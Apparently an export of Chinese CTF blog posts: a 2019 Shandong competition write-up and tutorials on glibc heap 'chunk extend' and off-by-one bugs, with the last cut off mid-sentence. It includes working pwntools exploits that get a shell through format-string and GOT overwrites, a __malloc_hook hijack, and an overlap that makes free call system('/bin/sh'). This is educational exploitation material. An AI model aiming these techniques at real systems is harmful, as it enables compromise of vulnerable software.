[{"title":"山东深思杯write up","url":"/2019/11/03/山东深思杯write-up/","content":"# pwn\n\n## pwn1\n\n题目给了一个backdoor ，满足约束条件即可\n\n```python\nfrom pwn import *\ncontext.log_level='debug'\np = process(\"./pwn_MinZhu\")\n#p =remote(\"172.29.1.38\", 9999)\nelf = ELF(\"./pwn_MinZhu\")\nsystem = 0x08048696\nplt = elf.got['puts']\n\np.sendlineafter(\"Key:\",\"xNd9y6\")\noffset = 4\n\np.recvuntil(\"your msg:\")\npayload=fmtstr_payload(4,{0x804A064:0x3})\np.sendline(payload)\n\npayload = fmtstr_payload(4,{0x804A060:8217})\np.sendline(payload)\npayload = fmtstr_payload(4,{plt:0x8048696})\n\np.sendline(payload)\n'''\nSHBYTE = 57 9\nSHBYTE1 = 78 N\nSHBYTE2 = 100 d\nCHAR S = 120 x\nv4 =6\nv3 = y\n\nxNd9y6\n'''\np.interactive()\n```\n\n## pwn2\n\n```python\nfrom pwn import *\ncontext.log_level='debug'\np = process(\"./pwn\")\nelf = ELF(\"./pwn\")\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\n\ndef add(size,content):\n\tp.sendlineafter(\"Your choice:\",str(1))\n\tp.sendlineafter(\"Input the length of data:\",str(size))\n\tp.recvuntil(\"Leave your message:\\n\")\n\tp.send(content)\n\ndef delete(idx):\n\tp.sendlineafter(\"Your choice:\",str(2))\n\tp.sendlineafter(\"\\nInput the index of sticky note that you want to delete:\\n\",str(idx))\n\ndef show():\n\tp.sendlineafter(\"Your choice:\",str(3))\n\ndef modify(idx,content):\n\tp.sendlineafter(\"Your choice:\",str(4))\n\tp.sendlineafter(\"at you want to modify:\\n\",str(idx))\n\tp.recvuntil(\"Enter what you want to modify:\\n\")\n\tp.send(content)\n# step 1 :unsorted bin attack to leak libc\n# allocate unsorted bin to make libc addr into chunk\nadd(0x7f,\"\\n\")\nadd(0x7f,\"\\n\")\ndelete(1)\nadd(0x7f,\"aaaaaaaa\")\nshow()\nlibc_base = u64(p.recvuntil('\\x7f')[-6:]+'\\x00\\x00')-libc.symbols['__malloc_hook']-0x68\n# double free and uaf\nadd(0x68,'\\n') # 4\nadd(0x68,'\\n') # 5\nadd(0x68,'\\n') # 6\ndelete(4)\nmodify(4,p64(libc_base+0x3c4aed))\nadd(0x68,'\\n') # 7\nadd(0x68,0x13*'a'+p64(libc_base+0xf1147)) # 7\np.sendline('1')\np.recvuntil('\\nInput the length of data:\\n')\np.sendline('32')\np.interactive()\n```\n","tags":["write up"],"categories":["CTF"]},{"title":"chunk extend","url":"/2019/10/21/chunk-extend/","content":"\n## 介绍\n\nchunk extend 是堆漏洞的一种常见利用手法，通过 extend 可以实现 chunk overlapping 的效果。这种利用方法需要以下的时机和条件\n\n* 程序中存在基于堆的漏洞\n* 漏洞可以控制 chunk header 中的数据\n\n\n\n## 原理\n\nchunk extend 技术能够产生的原因在于 ptmalloc 在堆 chunk 进行操作时使用的各种宏。\n\n在 ptmalloc 中，获取 chunk 块大小操作如下\n\n~~~cpp\n/* Get size, ignoring use bits */\n#define chunksize(p) (chunksize_nomask(p) & ~(SIZE_BITS))\n\n/* Like chunksize, but do not mask SIZE_BITS.  */\n#define chunksize_nomask(p) ((p)->mchunk_size)\n~~~\n\n一种是直接获取 chunk 的大小，不忽略掩码部分，另外一种是忽略掩码部分。\n\n在 ptmalloc 中，获取下一 chunk 块地址的操作如下\n\n~~~cpp\n/* Ptr to next physical malloc_chunk. */\n#define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))\n~~~\n\n即使用当前块指针加上当前块大小。\n\n在 ptmalloc 中，获取前一个chunk 信息的操作如下\n\n~~~cpp\n/* Size of the chunk below P.  Only valid if prev_inuse (P).  */\n#define prev_size(p) ((p)->mchunk_prev_size)\n\n/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */\n#define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))\n~~~\n\n即通过 malloc_chunk->prev_size 获取前一块大小，然后使用本 chunk 地址减去所得大小。\n\n在 ptmalloc，判断当前 chunk 是否 use 状态的操作如下：\n\n~~~cpp\n#define inuse(p)\n    ((((mchunkptr)(((char *) (p)) + chunksize(p)))->mchunk_size) & PREV_INUSE)\n~~~\n\n即查看下一个 chunk 的 prev_inuse 域，而下一块地址又如我们前面所述是根据当前chunk size 计算得出\n\n通过上面几个宏可以看出，ptmalloc 通过 chunk header 的数据判断 chunk 的使用情况和对chunk 的前后块进行定位。简而言之，chunk extend 就是通过控制 size 和 prev_size 域来实现跨越块操作从而导致 overlapping的。\n\n与 chunk extend 类似的还有一种称为 chunk shrink 的操作。这里只介绍 chunk extend 的利用。\n\n## 基本示例1：对 inuse 的fastbin 进行extend\n\n简单来说，该利用的效果是通过更改第一个块的大小来控制第二个块的内容。**注意，我们的示例都是在 64 位的程序。如果想在32位下进行测试，可以把 8 字节偏移改为 4 字节。**\n\n~~~cpp\nint main(void)\n{\n    void *ptr,*ptr1;\n\n    ptr=malloc(0x10);//分配第一个0x10的chunk\n    malloc(0x10);//分配第二个0x10的chunk\n\n    *(long long *)((long long)ptr-0x8)=0x41;// 修改第一个块的size域\n\n    free(ptr);\n    ptr1=malloc(0x30);// 实现 extend，控制了第二个块的内容\n    return 0;\n}\n~~~\n\n当两个 malloc 语句执行之后，堆的内存分布如下\n\n~~~cpp\n0x602000:   0x0000000000000000  0x0000000000000021 <=== chunk 1\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000021 <=== chunk 2\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000020fc1 <=== top chunk\n~~~\n\n之后，我们会把 chunk1 的 size 域更改为 0x41，0x41 是因为 chunk 的 size 域包含了用户控制的大小和 header 的大小。如上所示正好大小为 0x40.在题目中这一步可以由堆溢出得到。\n\n~~~cpp\n0x602000:   0x0000000000000000  0x0000000000000041 <=== 篡改大小\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000021\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000020fc1\n~~~\n\n执行 free 之后，我们可以看到 chunk2 与 chunk1 合成一个 0x40 大小的 chunk，一起释放了。\n\n~~~assembly\nFastbins[idx=0, size=0x10] 0x00\nFastbins[idx=1, size=0x20] 0x00\nFastbins[idx=2, size=0x30]  ←  Chunk(addr=0x602010, size=0x40, flags=PREV_INUSE)\nFastbins[idx=3, size=0x40] 0x00\nFastbins[idx=4, size=0x50] 0x00\nFastbins[idx=5, size=0x60] 0x00\nFastbins[idx=6, size=0x70] 0x00\n~~~\n\n之后我们通过 malloc(0x30) 得到 chunk1 + chunk2 的块，此时就可以直接控制 chunk2 中的内容，我们也把这种状态称为 overlapping chunk。\n\n~~~assembly\ncall   0x400450 <malloc@plt>\nmov    QWORD PTR [rbp-0x8], rax\n\nrax = 0x602010\n~~~\n\n## 基本示例2：对 inuse 的 smallbin 进行 extend\n\n通过之前深入理解堆的实现部分的内容，我们得知处于 fastbin 范围的 chunk 释放后会被植入 fastbin 链表中。以下这个示例中，我们使用 0x80 这个大小来分配堆（作为对比，fastbin 默认的最大的 chunk 可使用的范围是 0x70）\n\n~~~cpp\nint main()\n{\n    void *ptr,*ptr1;\n\n    ptr=malloc(0x80);//分配第一个 0x80 的chunk1\n    malloc(0x10); //分配第二个 0x10 的chunk2\n    malloc(0x10); //防止与top chunk合并\n\n    *(int *)((int)ptr-0x8)=0xb1;\n    free(ptr);\n    ptr1=malloc(0xa0);\n}\n~~~\n\n在这个例子中，因为分配的 size 不处于 fastbin 的范围，因此在释放时如果与 top chunk 相连会导致和 top chunk 合并。所以我们需要额外分配一个chunk ，把释放的块与 top chunk 隔开。\n\n~~~assembly\n0x602000:   0x0000000000000000  0x00000000000000b1 <===chunk1 篡改size域\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000000  0x0000000000000021 <=== chunk2\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x0000000000000000  0x0000000000000021 <=== 防止合并的chunk\n0x6020c0:   0x0000000000000000  0x0000000000000000\n0x6020d0:   0x0000000000000000  0x0000000000020f31 <=== top chunk\n~~~\n\n释放后，chunk1 把 chunk2 的内容吞并掉并一起置入 unsorted bin\n\n~~~assembly\n0x602000:   0x0000000000000000  0x00000000000000b1 <=== 被放入unsorted bin\n0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000000  0x0000000000000021\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x00000000000000b0  0x0000000000000020 <=== 注意此处标记为空\n0x6020c0:   0x0000000000000000  0x0000000000000000\n0x6020d0:   0x0000000000000000  0x0000000000020f31 <=== top chunk\n~~~\n\n~~~assembly\n[+] unsorted_bins[0]: fw=0x602000, bk=0x602000\n →   Chunk(addr=0x602010, size=0xb0, flags=PREV_INUSE)\n~~~\n\n再次进行分配的时候就会取回 chunk1 和 chunk2 的空间，此时我们就可以控制 chunk2 中的内容\n\n~~~assembly\n     0x4005b0 <main+74>        call   0x400450 <malloc@plt>\n →   0x4005b5 <main+79>        mov    QWORD PTR [rbp-0x8], rax\n\n     rax : 0x0000000000602010\n~~~\n\n## 基本示例3：对 free 的 smallbin 进行 extend\n\n示例3 是在示例2 的基础上进行的，这次我们先释放 chunk1，然后再修改处于 unsorted bin 中的 size 域。\n\n~~~cpp\nint main()\n{\n    void *ptr,*ptr1;\n\n    ptr=malloc(0x80);//分配第一个0x80的chunk1\n    malloc(0x10);//分配第二个0x10的chunk2\n\n    free(ptr);//首先进行释放，使得chunk1进入unsorted bin\n\n    *(int *)((int)ptr-0x8)=0xb1;\n    ptr1=malloc(0xa0);\n}\n~~~\n\n两次 malloc 之后的结果如下\n\n~~~assembly\n0x602000:   0x0000000000000000  0x0000000000000091 <=== chunk 1\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000000  0x0000000000000021 <=== chunk 2\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x0000000000000000  0x0000000000020f51\n~~~\n\n我们首先释放 chunk1 使他进入 unsorted bin 中\n\n~~~assembly\n     unsorted_bins[0]: fw=0x602000, bk=0x602000\n →   Chunk(addr=0x602010, size=0x90, flags=PREV_INUSE)\n\n0x602000:   0x0000000000000000  0x0000000000000091 <=== 进入unsorted bin\n0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000090  0x0000000000000020 <=== chunk 2\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x0000000000000000  0x0000000000020f51 <=== top chunk\n~~~\n\n然后 篡改 chunk1 的 size 域\n\n~~~cpp\n0x602000:   0x0000000000000000  0x00000000000000b1 <=== size域被篡改\n0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000090  0x0000000000000020\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x0000000000000000  0x0000000000020f51\n~~~\n\n此时再进行 malloc 分配就可以得到 chunk1+chunk2 的堆块，从而控制了 chunk2 的内容。\n\n## Chunk Extend/Shrink 可以做什么\n\n 一般来说，这种技术并不能直接控制程序的执行流程，但是可以控制 chunk 中的内容。如果 chunk 存在字符串指针、函数指针等，就可以利用这些指针来进行信息泄露和控制执行流程。\n\n此外通过 extend 可以实现 chunk overlapping ，通过 overlapping 可以控制 chunk 的 fd/bk 指针从而可以实现 fastbin attack 等利用。\n\n\n\n## 基本示例4：通过 extend 后向 overlapping\n\n这里展示通过 extend 进行后向 overlapping，这也是在 CTF 中最常出现的情况，通过 overlapping 可以实现其他的一些利用。\n\n~~~cpp\nint main()\n{\n    void *ptr,*ptr1;\n\n    ptr=malloc(0x10);//分配第1个 0x80 的chunk1\n    malloc(0x10); //分配第2个 0x10 的chunk2\n    malloc(0x10); //分配第3个 0x10 的chunk3\n    malloc(0x10); //分配第4个 0x10 的chunk4    \n    *(int *)((int)ptr-0x8)=0x61;\n    free(ptr);\n    ptr1=malloc(0x50);\n}\n~~~\n\n在 malloc(0x50) 对 extend 区域重新占位后，其中 0x10 的fastbin 块依然可以正常的分配和释放，此时已经构成 overlapping，通过对 overlapping 的进行操作可以实现 fastbin attack。\n\n\n\n## 基本示例5：通过extend 前向 overlapping\n\n这里展示通过修改 pre_inuse 域和 pre_size 域实现合并前面的块。\n\n~~~cpp\nint main(void)\n{\n    void *ptr1,*ptr2,*ptr3,*ptr4;\n    ptr1=malloc(128);//smallbin1\n    ptr2=malloc(0x10);//fastbin1\n    ptr3=malloc(0x10);//fastbin2\n    ptr4=malloc(128);//smallbin2\n    malloc(0x10);//防止与top合并\n    free(ptr1);\n    *(int *)((long long)ptr4-0x8)=0x90;//修改pre_inuse域\n    *(int *)((long long)ptr4-0x10)=0xd0;//修改pre_size域\n    free(ptr4);//unlink进行前向extend\n    malloc(0x150);//占位块\n}\n~~~\n\n前向 extend 利用了 small bin 的 unlink 机制，通过修改 pre_size 域可以跨越多个chunk 进行合并实现 overlapping。\n\n## HITCON Training lab 13\n\n程序为 64 位动态链接程序，主要开启了 Canary 保护与 NX 保护。\n\n**程序逻辑**\n\n~~~bash\n--------------------------------\n          Heap Creator          \n--------------------------------\n 1. Create a Heap               \n 2. Edit a Heap                 \n 3. Show a Heap                 \n 4. Delete a Heap               \n 5. Exit                        \n--------------------------------\n~~~\n\n**创建堆**\n\n```cpp\nunsigned __int64 create_heap()\n{\n  _QWORD *v0; // rbx\n  signed int i; // [rsp+4h] [rbp-2Ch]\n  size_t size; // [rsp+8h] [rbp-28h]\n  char buf; // [rsp+10h] [rbp-20h]\n  unsigned __int64 v5; // [rsp+18h] [rbp-18h]\n\n  v5 = __readfsqword(0x28u);\n  for ( i = 0; i <= 9; ++i )\n  {\n    if ( !heaparray[i] )\n    {\n      heaparray[i] = malloc(0x10uLL);\n      if ( !heaparray[i] )\n      {\n        puts(\"Allocate Error\");\n        exit(1);\n      }\n      printf(\"Size of Heap : \");\n      read(0, &buf, 8uLL);\n      size = atoi(&buf);\n      v0 = heaparray[i];\n      v0[1] = malloc(size);\n      if ( !*((_QWORD *)heaparray[i] + 1) )\n      {\n        puts(\"Allocate Error\");\n        exit(2);\n      }\n      *(_QWORD *)heaparray[i] = size;\n      printf(\"Content of heap:\", &buf);\n      read_input(*((_QWORD *)heaparray[i] + 1), size);\n      puts(\"SuccessFul\");\n      return __readfsqword(0x28u) ^ v5;\n    }\n  }\n  return __readfsqword(0x28u) ^ v5;\n}\n```\n\n**编辑堆，比之前创建堆时的size多读入了一个字节，造成 off-by-one**\n\n```cpp\nunsigned __int64 edit_heap()\n{\n  int v1; // [rsp+Ch] [rbp-14h]\n  char buf; // [rsp+10h] [rbp-10h]\n  unsigned __int64 v3; // [rsp+18h] [rbp-8h]\n\n  v3 = __readfsqword(0x28u);\n  printf(\"Index :\");\n  read(0, &buf, 4uLL);\n  v1 = atoi(&buf);\n  if ( v1 < 0 || v1 > 9 )\n  {\n    puts(\"Out of bound!\");\n    _exit(0);\n  }\n  if ( heaparray[v1] )\n  {\n    printf(\"Content of heap : \", &buf);\n    read_input(*((_QWORD *)heaparray[v1] + 1), *(_QWORD *)heaparray[v1] + 1LL);\n    puts(\"Done !\");\n  }\n  else\n  {\n    puts(\"No such heap !\");\n  }\n  return __readfsqword(0x28u) ^ v3;\n}\n```\n\n\n\n### 基本功能\n\n程序大概是一个自定义的堆分配器，每个堆主要有两个成员：大小与内容指针。主要功能如下\n\n1. 创建堆，根据用户输入的长度，申请对应内存空间，并利用read 读取指定长度内容。这里长度没有进行检测，当长度为负数的时候，会出现任意长度堆溢出的漏洞。当前，前提是可以进行 malloc。此外，这里读取之后并没有设置 NULL。\n2. 编辑堆，根据指定的索引以及之前存储的堆的大小读取内容，但是这里读入的长度会比之前大 1，所以会存在 off by one 漏洞。\n3. 展示堆，输出指定索引堆的大小以及内容。\n4. 删除堆，删除指定堆，并且将对应指针设置为了NULL。\n\n\n\n## 利用\n\n基本利用思路如下\n\n1. 利用 off by one 漏洞覆盖下一个chunk 的size 字段，从而构造伪造的chunk 大小。\n2. 申请伪造的chunk 大小，从而产生 chunk overlap，进而修改关键指针。\n\n\n\nexp\n\n~~~python\n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom pwn import *\nr = process('./heapcreator')\nheap = ELF('./heapcreator')\nlibc = ELF('./libc.so.6')\n\ndef create(size, content):\n    r.recvuntil(\":\")\n    r.sendline(\"1\")\n    r.recvuntil(\":\")\n    r.sendline(str(size))\n    r.recvuntil(\":\")\n    r.sendline(content)\n\ndef edit(idx, content):\n    r.recvuntil(\":\")\n    r.sendline(\"2\")\n    r.recvuntil(\":\")\n    r.sendline(str(idx))\n    r.recvuntil(\":\")\n    r.sendline(content)\n\ndef show(idx):\n    r.recvuntil(\":\")\n    r.sendline(\"3\")\n    r.recvuntil(\":\")\n    r.sendline(str(idx))\n\ndef delete(idx):\n    r.recvuntil(\":\")\n    r.sendline(\"4\")\n    r.recvuntil(\":\")\n    r.sendline(str(idx))\n\nfree_got = 0x602018\ncreate(0x18, \"dada\")  # 0\ncreate(0x10, \"ddaa\")  # 1\n# overwrite heap 1's struct's size to 0x41\nedit(0, \"/bin/sh\\x00\" + \"a\" * 0x10 + \"\\x41\")\n# trigger heap 1's struct to fastbin 0x40\n# heap 1's content to fastbin 0x20\ndelete(1)\n# new heap 1's struct will point to old heap 1's content, size 0x20\n# new heap 1's content will point to old heap 1's struct, size 0x30\n# that is to say we can overwrite new heap 1's struct\n# here we overwrite its heap content pointer to free@got\ncreate(0x30, p64(0) * 4 + p64(0x30) + p64(heap.got['free']))  #1\n# leak freeaddr\nshow(1)\nr.recvuntil(\"Content : \")\ndata = r.recvuntil(\"Done !\")\n\nfree_addr = u64(data.split(\"\\n\")[0].ljust(8, \"\\x00\"))\nlibc_base = free_addr - libc.symbols['free']\nlog.success('libc base addr: ' + hex(libc_base))\nsystem_addr = libc_base + libc.symbols['system']\n#gdb.attach(r)\n# overwrite free@got with system addr\nedit(1, p64(system_addr))\n# trigger system(\"/bin/sh\")\ndelete(0)\nr.interactive()\n~~~\n\n\n\n```python\nfrom pwn import *\nsh=process('./heapcreator')\nelf=ELF('./heapcreator')\nlibc=ELF('/lib/x86_64-linux-gnu/libc.so.6')\n\ndef create(size,value):\n    sh.recvuntil('Your choice :')\n    sh.sendline('1')\n    sh.recvuntil('Size of Heap :')\n    sh.sendline(str(size))\n    sh.recvuntil('Content of heap:')\n    sh.sendline(value)\n\ndef edit(idx,value):\n    sh.recvuntil('Your choice :')\n    sh.sendline('2')\n    sh.recvuntil('Index :')\n    sh.sendline(str(idx))\n    sh.recvuntil('Content of heap : ')\n    sh.sendline(value)\n\ndef show(idx):\n    sh.recvuntil('Your choice :')\n    sh.sendline('3')\n    sh.recvuntil('Index :')\n    sh.sendline(str(idx))\n\ndef delete(idx):\n    sh.recvuntil('Your choice :')\n    sh.sendline('4')\n    sh.recvuntil('Index :')\n    sh.sendline(str(idx))\n\nfree_got=elf.got['free']\ncreate(0x18,'aaaaaaa')  #idx0 实际分配了0x10的chunk，重用idx1的prev_size的8个字节\ncreate(0x10,'aaaaaaa')　#idx1　　\ncreate(0x10,'aaaaaaa')　　#idx2\ncreate(0x10,'/bin/sh\\x00')　　#idx3\npayload='a'*0x18+'\\x81'\nedit(0,payload)   #修改idx1的size为0x81\ndelete(1)　　#idx1进入0x70的unsorted bin\nsize='\\x08'.ljust(8,'\\x00')\npayload='b'*0x40+size+p64(free_got)\ncreate(0x70,payload)　　#分配到idx1 此时size为0x70，可以堆溢出到idx2，修改idx2的内容指针为free_got\nshow(2)　　#输出free真实地址,泄露libc基地址\nsh.recvuntil('Content :')\nfree_adr=u64(sh.recvline().strip().ljust(8,'\\x00'))\n\nprint 'free_adr: '+hex(free_adr)\nlibc_base=free_adr-libc.symbols['free']\nsystem_adr=libc_base+libc.symbols['system']\nprint 'libc_base: '+hex(libc_base)\nprint 'system_adr: '+hex(system_adr)\nedit(2,p64(system_adr)) #将free_got改为system地址\ndelete(3)　　　　　　　　#free(idx->content)触发\nsh.interactive()\n```\n","tags":["pwn","heap"],"categories":["CTF"]},{"title":"Geek 10th write up","url":"/2019/10/17/Geek-10th-write-up/"},{"title":"Off-By-One学习","url":"/2019/10/10/Off-By-One学习/","content":"\n严格来说 off-by-one 漏洞是一种特殊的溢出漏洞，off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节。\n\n## 原理\n\noff-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括\n\n* 使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。\n* 字符串操作不合适\n\n一般来说，单字节溢出被认为是难以利用，但是因为 linux 的堆管理机制 ptmalloc 验证的松散性，基于 linux 堆的 off-by-one 漏洞利用起来并不复杂，并且威力强大。此外，需要说明的一点是 off-by-one 是可以基于各种缓冲区的，比如栈、bss段等等。但是堆上（heap based）的 off-by-one 是 CTF 中比较常见的。我们这里仅讨论堆上的 off-by-one 情况。\n\n\n\n## off-by-one 利用思路\n\n1. 溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法\n2. 溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得`prev_in_use`位被清，这样前块会被认为是 free 块。(1) 这时可以选择使用 unlink 方法进行处理。(2) 另外，这时`prev_size`域就会启用，就可以伪造`prev_size`，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照`prev_size`找到块的后一块（理论上是当前正在unlink的块）与当前正在 unlink 的块大小是否相等。\n\n最新版本代码中，已加入针对 2 中后一种方法的 check ，但是在 2.28 前并没有该 check。\n\n~~~cpp\n/* consolidate backward */\n    if (!prev_inuse(p)) {\n      prevsize = prev_size (p);\n      size += prevsize;\n      p = chunk_at_offset(p, -((long) prevsize));\n      /* 后两行代码在最新版本中加入，则 2 的第二种方法无法使用，但是 2.28 及之前都没有问题 */\n      if (__glibc_unlikely (chunksize(p) != prevsize))\n        malloc_printerr (\"corrupted size vs. prev_size while consolidating\");\n      unlink_chunk (av, p);\n    }\n~~~\n\n### 示例1\n\n~~~cpp\nint my_gets(char *ptr,int size)\n{\n    int i;\n    for(i=0;i<=size;i++)\n    {\n        ptr[i]=getchar();\n    }\n    return i;\n}\nint main()\n{\n    void *chunk1,*chunk2;\n    chunk1=malloc(16);\n    chunk2=malloc(16);\n    puts(\"Get Input:\");\n    my_gets(chunk1,16);\n    return 0;\n}\n~~~\n\n我们自己编写的 my_gets 函数导致了一个 off-by-one 漏洞，原因是 for 循环的边界没有控制好导致写入多执行了依次，这也被称为栅栏错误\n\n我们使用gdb 对程序进行调试，在进行输入前可以看到分配的两个用户区域为16 字节的堆块\n\n~~~assembly\n0x602000:   0x0000000000000000  0x0000000000000021 <=== chunk1\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000021 <=== chunk2\n0x602030:   0x0000000000000000  0x0000000000000000\n~~~\n\n当我们执行 my_gets 进行输入之后，可以看到数据发生了溢出覆盖到了下一个堆块的 prev_size 域 print 'A'*17\n\n~~~assembly\n0x602000:   0x0000000000000000  0x0000000000000021 <=== chunk1\n0x602010:   0x4141414141414141  0x4141414141414141\n0x602020:   0x0000000000000041  0x0000000000000021 <=== chunk2\n0x602030:   0x0000000000000000  0x0000000000000000\n~~~\n\n### 实例2\n\n第二种常见的导致 off-by-one 的场景就是字符串操作了，常见的原因是字符串的结束符计算有误\n\n~~~cpp\nint main(void)\n{\n    char buffer[40]=\"\";\n    void *chunk1;\n    chunk1=malloc(24);\n    puts(\"Get Input\");\n    gets(buffer);\n    if(strlen(buffer)==24)\n    {\n        strcpy(chunk1,buffer);\n    }\n    return 0;\n}\n~~~\n\n程序乍看上去没有任何问题（不考虑栈溢出），可能很多人在实际的代码中也是这样写的。\n但是 strlen 和 strcpy 的行为不一致却导致了 off-by-one 的发生。\nstrlen 是我们很熟悉的计算 ascii 字符串长度的函数，这个函数在计算字符串长度时是不把结束符 `'\\x00'` 计算在内的，但是 strcpy 在复制字符串时会拷贝结束符 `'\\x00'` 。这就导致了我们向 chunk1 中写入了 25 个字节，我们使用 gdb 进行调试可以看到这一点。\n\n```assembly\n0x602000:   0x0000000000000000  0x0000000000000021\n0x602010:   0x4141414141414141  0x4141414141414141\n0x602020:   0x4141414141414141  0x0000000000000400\n```\n\n可以看到 next chunk 的 size 域低字节被结束符 `'\\x00'` 覆盖，这种又属于 off-by-one 的一个分支称为 NULL byte off-by-one，我们在后面会看到 off-by-one 与 NULL byte off-by-one 在利用上的区别。\n还是有一点就是为什么是低字节被覆盖呢，因为我们通常使用的 CPU 的字节序都是小端法的，比如一个 DWORD 值在使用小端法的内存中是这样储存的\n\n```assembly\nDWORD 0x41424344\n内存  0x44,0x43,0x42,0x41\n```\n\n### 实例1-- Asis CTF 2016 b00ks\n\n**题目介绍**\n\n题目是一个常见的菜单式程序，功能是一个图书管理系统。\n\n```python\n1. Create a book\n2. Delete a book\n3. Edit a book\n4. Print book detail\n5. Change current author name\n6. Exit\n```\n\n题目提供了创建、删除、编辑、打印图书的功能。题目是64位程序，保护如下所示\n\n```bash\nCanary                        : No\nNX                            : Yes\nPIE                           : Yes\nFortify                       : No\nRelRO                         : Full\n```\n\n程序每创建一个 book 会分配 0x20 字节的结构来维护它的信息\n\n```cpp\nstruct book\n{\n    int id;\n    char *name;\n    char *description;\n    int size;\n}\n```\n\n**create**\n\nbook 结构中存在 name 和 description，name 和 description 在堆上分配。首先分配 name buffer，使用malloc。大小自定但小于 32.\n\n~~~cpp\nprintf(\"\\nEnter book name size: \", *(_QWORD *)&size);\n__isoc99_scanf(\"%d\", &size);\nprintf(\"Enter book name (Max 32 chars): \", &size);\nptr = malloc(size);\n~~~\n\n之后分配 description ，同样大小自定但无限制。\n\n```cpp\nprintf(\"\\nEnter book description size: \", *(_QWORD *)&size);\n__isoc99_scanf(\"%d\", &size);\n\nv5 = malloc(size);\n```\n\n之后分配 book 结构的内存\n\n~~~cpp\nbook = malloc(0x20uLL);\nif ( book )\n{\n    *((_DWORD *)book + 6) = size;\n    *((_QWORD *)off_202010 + v2) = book;\n    *((_QWORD *)book + 2) = description;\n    *((_QWORD *)book + 1) = name;\n    *(_DWORD *)book = ++unk_202024;\n    return 0LL;\n}\n~~~\n\n**漏洞**\n\n程序编写的 read 函数存在 null byte off-by-one 漏洞，仔细观察这个 read 函数可以发现对于边界的考虑是不当的。\n\n~~~cpp\nsigned __int64 __fastcall my_read(_BYTE *ptr, int number)\n{\n  int i; // [rsp+14h] [rbp-Ch]\n  _BYTE *buf; // [rsp+18h] [rbp-8h]\n\n  if ( number <= 0 )\n    return 0LL;\n  buf = ptr;\n  for ( i = 0; ; ++i )\n  {\n    if ( (unsigned int)read(0, buf, 1uLL) != 1 )\n      return 1LL;\n    if ( *buf == '\\n' )\n      break;\n    ++buf;\n    if ( i == number )\n      break;\n  }\n  *buf = 0; --》 漏洞位置\n  return 0LL;\n}\n~~~\n\n#### 利用\n\n创建两个`b00k`, 在`first b00k`中伪造`b00k`进而控制`second b00k`的`description`指针, 将该指针改为`__free_hook`, 修改`second b00k`的`description`为`execve(\"/bin/sh\")`, 最后`free`\n\n**泄露**\n\n因为程序中的 my_read 函数存在 null byte off-by-one ，事实上 my_read 读入的结束符 '\\x00' 是写入到 0x555555756060 的位置的。这样当 0x555555756060～0x555555756068 写入 book 指针时就会覆盖掉结束符 '\\x00' ，所以这里是存在一个地址泄漏的漏洞。通过打印 author name 就可以获得 pointer array 中第一项的值。\n\nbooks 